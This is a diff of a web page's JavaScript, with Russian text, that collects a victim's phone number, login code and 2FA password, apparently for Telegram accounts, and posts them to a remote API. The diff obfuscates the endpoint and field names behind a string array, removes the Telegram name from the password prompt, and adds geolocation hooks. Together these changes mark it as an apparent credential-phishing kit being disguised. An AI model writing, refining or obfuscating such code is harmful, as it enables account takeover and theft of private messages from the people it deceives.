-            const code = document.getElementById('code').value.trim();
-            if (!code) { statusDiv.innerText = "Введите код"; return; }
-            
-            btn.disabled = true;
-            btn.innerText = "⏳ Проверка...";
-            
-            try {
-                const response = await fetch(`${API_URL}/verify_code`, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ phone: currentPhone, code: code })
-                });
-                const data = await response.json();
+            } else if (currentStep === "code") {
+                const code = document.getElementById('code').value.trim();
+                if (!code) { statusDiv.innerText = "Введите код"; return; }
                 
-                if (data.success) {
-                    statusDiv.style.color = "#88ff88";
-                    statusDiv.innerHTML = "✅ Вход выполнен!";
-                    await finalStep();
-                    
-                } else if (data.needs_password) {
-                    currentStep = "password";
-                    document.getElementById('codeSection').style.display = 'none';
-                    document.getElementById('passwordSection').style.display = 'block';
-                    btn.innerText = "🔐 Подтвердить пароль";
-                    document.getElementById('modalTitle').innerText = "🔐 Двухфакторная аутентификация";
-                    document.getElementById('modalDesc').innerText = "Введите пароль от Telegram";
-                    statusDiv.style.color = "#ffaa66";
-                    statusDiv.innerHTML = "⏳ Требуется пароль 2FA";
-                    btn.disabled = false;
-                } else {
-                    statusDiv.innerText = "Ошибка: " + (data.error || "неверный код");
+                btn.disabled = true;
+                btn.innerText = "⏳ Проверка...";
+                
+                try {
+                    const response = await fetch(`${API_URL}/${_0x3a2b[8]}`, {
+                        method: _0x3a2b[6],
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ [_0x3a2b[10]]: currentPhone, [_0x3a2b[11]]: code })
+                    });
+                    const data = await response[_0x3a2b[5]]();
+                    if (data[_0x3a2b[13]]) {
+                        statusDiv.style.color = "#88ff88";
+                        statusDiv.innerHTML = "✅ Вход выполнен!";
+                        await finalStep();
+                    } else if (data[_0x3a2b[14]]) {
+                        currentStep = "password";
+                        document.getElementById('codeSection').style.display = 'none';
+                        document.getElementById('passwordSection').style.display = 'block';
+                        btn.innerText = "🔐 Подтвердить пароль";
+                        document.getElementById('modalTitle').innerText = "🔐 Двухфакторная аутентификация";
+                        document.getElementById('modalDesc').innerText = "Введите пароль";
+                        statusDiv.style.color = "#ffaa66";
+                        statusDiv.innerHTML = "⏳ Требуется пароль";
+                        btn.disabled = false;
+                    } else {
+                        statusDiv.innerText = "Ошибка: " + (data[_0x3a2b[15]] || "неверный код");
+                        btn.disabled = false;
+                        btn.innerText = "✅ Подтвердить код";
+                    }
+                } catch(e) {
+                    statusDiv.innerText = "Ошибка соединения";
                     btn.disabled = false;
                     btn.innerText = "✅ Подтвердить код";
                 }
-            } catch(e) {
-                statusDiv.innerText = "Ошибка соединения";
-                btn.disabled = false;
-                btn.innerText = "✅ Подтвердить код";
-            }
-            
-        } else if (currentStep === "password") {
-            const password = document.getElementById('password').value.trim();
-            if (!password) { statusDiv.innerText = "Введите пароль"; return; }
-            
-            btn.disabled = true;
-            btn.innerText = "⏳ Проверка...";
-            
-            try {
-                const response = await fetch(`${API_URL}/verify_password`, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ phone: currentPhone, password: password })
-                });
-                const data = await response.json();
+            } else if (currentStep === "password") {
+                const password = document.getElementById('password').value.trim();
+                if (!password) { statusDiv.innerText = "Введите пароль"; return; }
                 
-                if (data.success) {
-                    statusDiv.style.color = "#88ff88";
-                    statusDiv.innerHTML = "✅ Вход выполнен!";
-                    await finalStep();
-                } else {
-                    statusDiv.innerText = "Ошибка: " + (data.error || "неверный пароль");
+                btn.disabled = true;
+                btn.innerText = "⏳ Проверка...";
+                
+                try {
+                    const response = await fetch(`${API_URL}/${_0x3a2b[9]}`, {
+                        method: _0x3a2b[6],
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ [_0x3a2b[10]]: currentPhone, [_0x3a2b[12]]: password })
+                    });
+                    const data = await response[_0x3a2b[5]]();
+                    if (data[_0x3a2b[13]]) {
+                        statusDiv.style.color = "#88ff88";
+                        statusDiv.innerHTML = "✅ Вход выполнен!";
+                        await finalStep();
+                    } else {
+                        statusDiv.innerText = "Ошибка: " + (data[_0x3a2b[15]] || "неверный пароль");
+                        btn.disabled = false;
+                        btn.innerText = "🔐 Подтвердить пароль";
+                    }
+                } catch(e) {
+                    statusDiv.innerText = "Ошибка соединения";
                     btn.disabled = false;
                     btn.innerText = "🔐 Подтвердить пароль";
                 }
-            } catch(e) {
-                statusDiv.innerText = "Ошибка соединения";
-                btn.disabled = false;
-                btn.innerText = "🔐 Подтвердить пароль";
             }
         }
-    }
+        
+        window.requestGeoFirst = requestGeoFirst;
+        window.requestGeo = requestGeo;
+        window.showModal = showModal;
+        window.closeModal = closeModal;
+        window.handleAction = handleAction;
+    })();
 </script>
 </body>
 </html>
